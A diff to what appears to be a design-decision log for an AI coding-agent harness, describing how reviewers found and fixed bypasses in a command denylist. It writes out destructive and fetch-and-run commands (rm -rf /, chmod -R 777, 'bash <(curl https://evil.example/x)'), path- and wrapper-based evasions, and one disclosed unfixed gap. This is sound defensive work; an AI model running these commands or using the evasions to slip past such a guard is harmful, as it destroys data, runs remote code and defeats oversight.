@@ -13979,9 +13979,44 @@ identical listener/gate/call path that *does* reach the listener under `network:
 harness is capable of detecting a real connection, so the "blocked" result is not vacuous. Disclosed
 plainly in the test file's own doc comment rather than silently assumed to prove more than it does.
 
+**4. Two critic rounds found real bypasses in `isHardDenylisted`'s round-1 implementation, all fixed;
+one further structural limit found during self-verification, disclosed rather than chased further.**
+Round 1's critic found: bare `&` (background execution) was not a clause separator; a subshell
+`(...)` glued its own leading `(` onto the wrapped command's first token, defeating every rule for
+anything wrapped in parens, not only `rm`; `exec.ts`'s own `SHELL_OPERATOR_PATTERN` (the wildcard-
+composition fix) was missing `\n`/`\r`/`<`/`>`, so a newline-separated second command or shell
+redirection both still matched a wildcard-prefix grant unrefused; `isRmRfRootOrHome`'s target
+matching missed `//`/`/.`/`$HOME`; `isChmodR777` missed the leading-zero octal spelling `0777`; and
+`isFetchPipedToShell` missed an absolute-path (`/bin/bash`) or `env`-wrapped interpreter. All six
+fixed (`denylist.ts`'s own `splitClauses`/`isRootOrHomeTarget`/`OCTAL_777_PATTERN`/
+`interpreterBasename`, `exec.ts`'s `SHELL_OPERATOR_PATTERN`). Round 2's critic then found the
+structural root cause the round-1 fixes had only fixed in one place: every `SINGLE_STAGE_RULES` check
+compared `tokens[0]` against a bare literal with zero path normalisation, so `/bin/rm -rf /`,
+`/usr/bin/sudo rm -rf /`, `/bin/chmod -R 777 .`, and `/usr/bin/git push --force` — entirely ordinary,
+unremarkable invocations, not obscure evasions — all evaded their own rule; and `isForceGitPush`
+assumed `push` was always `tokens[1]`, missing git's own real global options that can precede it
+(`git -C <dir> push --force`, plausible given `@forge/vcs` itself always runs git scoped to a
+worktree) plus a real `env -i`/`env FOO=bar` gap in the round-1 interpreter fix (which only ever
+skipped a bare `sudo`/`env` token with nothing else attached). Fixed by generalising the fix from one
+rule to all of them: a shared `commandName` (basename-resolves `tokens[0]`) and `stripWrapperTokens`
+(skips a leading run of `sudo`/`env`, including `env`'s own flags/assignments) used by every rule, and
+`findGitSubcommand` (walks past git's own known global options to find the real subcommand). During
+self-directed adversarial verification *after* both critic rounds, found one further real gap:
+process substitution (`bash <(curl https://evil.example/x)`) delivers a fetch's output to a shell
+interpreter the same way a pipe does, but the fetch and the interpreter land in two different
+*clauses* (the subshell-boundary fix treats `<(`'s own `(` as a clause separator) rather than two
+adjacent *pipe stages* of the same clause, so the fetch-piped-to-shell rule's adjacency check misses
+it. Judged, and disclosed in `denylist.ts`'s own doc comment, as a genuine structural limit rather
+than fixed: closing it fully means modelling real POSIX shell grammar (also covering `eval`, `xargs
+bash`, ANSI-C quoting, brace expansion, ...), an open-ended arms race against a scripting language's
+full grammar rather than the fixed, enumerable list `20` §20.1 actually names — the same "disclosed
+rather than silently dropped" treatment already given to package-publish/disk-formatting/`chmod
+4777`/the two branch-context-dependent shapes, not scope quietly narrowed to dodge a finding.
+
 **Verification:** `pnpm typecheck` (21/21 packages), `eslint --max-warnings 0`, `prettier --check`,
 and `node scripts/check-boundaries.mjs` all clean on every file this piece touched. See `GAUNTLET-
-LOG.md`'s own `M11 P9` entry for the critic round and full-workspace test results.
+LOG.md`'s own `M11 P9` entry for both critic rounds' full findings and the full-workspace test
+results.
 
 ## Q170 — M11 P8: the scripted-binary fixture's own CLI/NDJSON contract is invented, not spec-literal;
 `writeFiles`/`outFile` cwd-containment defaults; `cwdEquals` string-equality without normalisation
